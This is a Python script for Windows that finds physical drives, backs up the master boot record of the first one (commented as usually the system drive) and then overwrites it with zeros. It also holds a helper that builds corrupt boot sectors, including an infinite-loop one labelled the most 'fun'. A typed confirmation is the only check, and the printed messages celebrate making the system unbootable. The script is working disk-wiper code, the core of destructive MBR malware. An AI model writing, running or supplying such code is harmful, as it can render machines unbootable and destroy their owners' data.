import struct
import os
import ctypes
from ctypes import wintypes

def read_mbr(physical_drive_number):
    """Read MBR from physical drive on Windows"""
    device_path = f"\\\\.\\PhysicalDrive{physical_drive_number}"
    
    try:
        # Use CreateFile with direct access flags
        GENERIC_READ = 0x80000000
        FILE_SHARE_READ = 0x00000001
        FILE_SHARE_WRITE = 0x00000002
        OPEN_EXISTING = 3
        
        handle = ctypes.windll.kernel32.CreateFileW(
            device_path,
            GENERIC_READ,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            None,
            OPEN_EXISTING,
            0,
            None
        )
        
        if handle == -1:
            print(f"Error: Cannot open {device_path}")
            return None
        
        # Read 512 bytes
        mbr_data = ctypes.create_string_buffer(512)
        bytes_read = wintypes.DWORD()
        
        success = ctypes.windll.kernel32.ReadFile(
            handle,
            mbr_data,
            512,
            ctypes.byref(bytes_read),
            None
        )
        
        ctypes.windll.kernel32.CloseHandle(handle)
        
        if success:
            return bytes(mbr_data.raw)
        else:
            print(f"Error reading MBR: {ctypes.GetLastError()}")
            return None
            
    except Exception as e:
        print(f"Error reading MBR: {e}")
        return None

def write_mbr(physical_drive_number, mbr_data):
    """Write MBR to physical drive on Windows - DESTRUCTIVE"""
    if len(mbr_data) != 512:
        # Pad or truncate to exactly 512 bytes
        mbr_data = mbr_data.ljust(512, b'\x00')[:512]
    
    device_path = f"\\\\.\\PhysicalDrive{physical_drive_number}"
    
    # Extreme safety warnings
    print(f"🚨 NUKING MBR ON: {device_path}")
    print(f"💀 THIS WILL DESTROY BOOTLOADER AND MAKE SYSTEM UNBOOTABLE")
    print(f"💀 TARGET: PhysicalDrive{physical_drive_number}")
    confirmation = input("TYPE 'KILL-MBR' TO CONFIRM DESTRUCTION: ")
    
    if confirmation != 'KILL-MBR':
        print("Operation cancelled")
        return False
    
    try:
        # Use CreateFile with write access
        GENERIC_WRITE = 0x40000000
        FILE_SHARE_READ = 0x00000001
        FILE_SHARE_WRITE = 0x00000002
        OPEN_EXISTING = 3
        
        handle = ctypes.windll.kernel32.CreateFileW(
            device_path,
            GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            None,
            OPEN_EXISTING,
            0,
            None
        )
        
        if handle == -1:
            print(f"Error: Cannot open {device_path} for writing")
            return False
        
        # Write 512 bytes
        bytes_written = wintypes.DWORD()
        buffer = ctypes.create_string_buffer(mbr_data)
        
        success = ctypes.windll.kernel32.WriteFile(
            handle,
            buffer,
            512,
            ctypes.byref(bytes_written),
            None
        )
        
        # Force write to disk
        ctypes.windll.kernel32.FlushFileBuffers(handle)
        ctypes.windll.kernel32.CloseHandle(handle)
        
        if success and bytes_written.value == 512:
            print("✅ MBR DESTROYED - SYSTEM UNBOOTABLE")
            return True
        else:
            print(f"❌ Error writing MBR: {ctypes.GetLastError()}")
            return False
            
    except Exception as e:
        print(f"❌ Error writing MBR: {e}")
        return False

def list_physical_drives():
    """List available physical drives on Windows"""
    drives = []
    
    for drive_num in range(10):  # Check first 10 drives
        device_path = f"\\\\.\\PhysicalDrive{drive_num}"
        try:
            GENERIC_READ = 0x80000000
            FILE_SHARE_READ = 0x00000001
            FILE_SHARE_WRITE = 0x00000002
            OPEN_EXISTING = 3
            
            handle = ctypes.windll.kernel32.CreateFileW(
                device_path,
                GENERIC_READ,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                None,
                OPEN_EXISTING,
                0,
                None
            )
            
            if handle != -1:
                drives.append(drive_num)
                ctypes.windll.kernel32.CloseHandle(handle)
                print(f"FOUND: PhysicalDrive{drive_num}")
                
        except:
            pass
            
    return drives

def create_corrupt_mbr():
    """Create various types of corrupt MBRs"""
    # Option A: All zeros (complete wipe)
    zeros = b'\x00' * 512
    
    # Option B: Broken boot signature
    broken_sig = b'\x00' * 510 + b'\x00\x00'  # Missing 55 AA
    
    # Option C: Invalid partition table
    corrupt_pt = b'\xEB' * 64 + b'\x00' * 446 + b'\x55\xAA'
    
    # Option D: Infinite loop boot code
    infinite_loop = b'\xEB\xFE' + b'\x00' * 508 + b'\x55\xAA'  # jmp $
    
    return infinite_loop  # Most "fun" option

# 🚀 DANGEROUS OPERATIONS - WINDOWS 🚀

if __name__ == "__main__":
    # 1. Find available physical drives
    print("🔍 Scanning for physical drives...")
    drives = list_physical_drives()
    print(f"Available drives: {drives}")
    
    if drives:
        # 2. Select target drive (BE CAREFUL!)
        target_drive = drives[0]  # Usually 0 is main system drive
        print(f"🎯 Targeting: PhysicalDrive{target_drive}")
        
        # 3. Backup current MBR first (highly recommended)
        backup = read_mbr(target_drive)
        if backup:
            with open(f"mbr_backup_PhysicalDrive{target_drive}.bin", "wb") as f:
                f.write(backup)
            print(f"💾 MBR backed up to mbr_backup_PhysicalDrive{target_drive}.bin")
            
            # Verify boot signature
            if backup[510:512] == b'\x55\xAA':
                print("✓ Valid boot signature found in backup")
            else:
                print("✗ Invalid boot signature in backup")
        
        # 4. DESTROY MBR with zeros
        print("\n" + "="*50)
        print("🚨 DESTRUCTIVE OPERATION - MBR WIPE")
        print("="*50)
        write_mbr(target_drive, b'\x00' * 512)
        
        # 5. Verify destruction
        verify = read_mbr(target_drive)
        if verify == b'\x00' * 512:
            print("☠️  MBR SUCCESSFULLY DESTROYED - SYSTEM WILL NOT BOOT")
        else:
            print("⚠️  MBR may not be fully destroyed")
        
        # 6. Optional: Write custom corrupt MBR instead of zeros
        # print("\n" + "="*50)
        # print("🚨 WRITING CORRUPT MBR")
        # print("="*50)
        # corrupt_mbr = create_corrupt_mbr()
        # write_mbr(target_drive, corrupt_mbr)
